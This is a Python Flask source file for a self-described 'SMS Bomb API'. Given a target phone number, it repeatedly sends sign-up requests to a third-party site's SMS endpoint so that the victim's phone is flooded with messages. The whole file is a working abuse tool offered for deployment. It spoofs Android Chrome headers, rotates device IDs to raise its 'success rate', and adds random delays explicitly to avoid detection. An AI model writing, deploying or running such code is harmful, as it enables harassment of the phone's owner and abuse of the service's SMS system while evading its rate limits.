from flask import Flask, request, jsonify
import requests
import threading
import time
import random
import os

app = Flask(__name__)

# List of different device IDs from your 10 curl commands
DEVICE_IDS = [
    "AVl4a4UbUrSxqF8U",
    "mPWgSsZeGwg2OmKa", 
    "InB8JfbExPT1jX6K",
    "YCief2f1QDKNYymf"
]

def send_sms_variation(phone_number, attempt_num, variation_num):
    """
    Function to send SMS using different variations from curl commands
    """
    url = "https://fastwebhost.site/sms-sender.php"
    
    # Base headers common to all variations
    base_headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Content-Type': 'application/json',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?1',
        'x-site-id': 'acewin',
        'origin': 'https://fastwebhost.site',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://fastwebhost.site/',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
        'priority': 'u=1, i'
    }
    
    # Use different device ID for each variation
    device_id = DEVICE_IDS[variation_num % len(DEVICE_IDS)]
    headers = base_headers.copy()
    headers['device-id'] = device_id
    
    data = {
        "phone": phone_number,
        "source": "SIGN_UP"
    }
    
    try:
        response = requests.post(
            url,
            headers=headers,
            json=data,
            timeout=10
        )
        
        print(f"Attempt {attempt_num}: Status Code - {response.status_code}")
        return {
            "attempt": attempt_num,
            "status_code": response.status_code,
            "success": response.status_code == 200
        }
    except Exception as e:
        print(f"Attempt {attempt_num}: Error - {str(e)}")
        return {
            "attempt": attempt_num,
            "error": str(e),
            "success": False
        }

@app.route('/bomb', methods=['GET'])
def bomb_sms():
    """
    API endpoint to trigger SMS bombing with multiple variations
    Usage: https://your-app.onrender.com/bomb?num=9876543210&repeat=10
    """
    # Get parameters from query string
    phone_number = request.args.get('num')
    repeat = request.args.get('repeat', 1)
    
    # Validate parameters
    if not phone_number:
        return jsonify({"error": "Phone number is required"}), 400
    
    try:
        repeat = int(repeat)
        if repeat <= 0:
            return jsonify({"error": "Repeat count must be positive"}), 400
        if repeat > 50:  # Safety limit for Render
            return jsonify({"error": "Repeat count too high. Maximum is 50"}), 400
    except ValueError:
        return jsonify({"error": "Repeat must be a valid number"}), 400
    
    # Start SMS bombing in a separate thread to avoid blocking
    def start_bombing():
        results = []
        for i in range(repeat):
            # Use different variation for each attempt (cycle through 4 variations)
            variation_num = i % 4
            result = send_sms_variation(phone_number, i+1, variation_num)
            results.append(result)
            
            # Random delay between requests to avoid detection (0.5 to 2 seconds)
            time.sleep(random.uniform(0.5, 2))
        
        # Print summary
        successful = sum(1 for r in results if r.get('success'))
        print(f"Bombing completed: {successful}/{repeat} successful")
    
    # Run in background thread
    thread = threading.Thread(target=start_bombing)
    thread.daemon = True
    thread.start()
    
    return jsonify({
        "message": "Bomb started successfully",
        "phone_number": phone_number,
        "repeat_count": repeat,
        "status": "running",
        "note": f"Using {len(DEVICE_IDS)} different device IDs rotating for better success rate"
    })

@app.route('/')
def home():
    return jsonify({
        "message": "SMS Bomb API is running",
        "usage": "/bomb?num=PHONE_NUMBER&repeat=COUNT",
        "example": "https://your-app.onrender.com/bomb?num=9876543210&repeat=10"
    })

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
